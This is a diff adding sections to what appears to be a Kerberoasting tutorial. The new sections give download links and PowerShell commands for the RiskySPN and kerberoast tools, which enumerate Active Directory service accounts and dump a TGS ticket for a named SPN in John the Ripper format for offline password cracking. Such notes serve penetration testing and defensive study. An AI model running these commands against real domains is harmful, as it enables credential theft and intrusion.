@@ -48,6 +48,51 @@ Any domain user can request tickets for any service
   * Service must not be active
 
 
+## SPN Discover
+## Find-PotentiallyCrackableAccounts.ps1
+```
+download script: https://raw.githubusercontent.com/cyberark/RiskySPN/master/Find-PotentiallyCrackableAccounts.ps1
+```
+```
+Import-Module .\Find-PotentiallyCrackableAccounts.ps1
+Find-PotentiallyCrackableAccounts -FullData -Verbose
+```
+
+<img src="/img/kerberosting/11.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/12.PNG" alt="Getting-gz" width="800" height="200"> 
+
+
+## GetUserSPNs.ps1
+```
+download script: https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1
+```
+```
+.\GetUserSPNs.ps1
+```
+
+
+<img src="/img/kerberosting/13.PNG" alt="Getting-gz" width="800" height="200"> 
+
+
+## TGSCipher.ps1
+Dump TGS ticket
+
+```
+download script:https://raw.githubusercontent.com/cyberark/RiskySPN/master/Get-TGSCipher.ps1
+```
+```
+ Import-Module .\Get-TGSCipher.ps1
+ Get-TGSCipher -SPN "MSSQLSvc/domainAD.karim.net:1443" -Format John
+ ```
+ 
+ <img src="/img/kerberosting/14.PNG" alt="Getting-gz" width="800" height="200"> 
+
+ 
+ 
+ 
+
+
+
 
 ## GetUserSPNs.py
 find user account used as service account
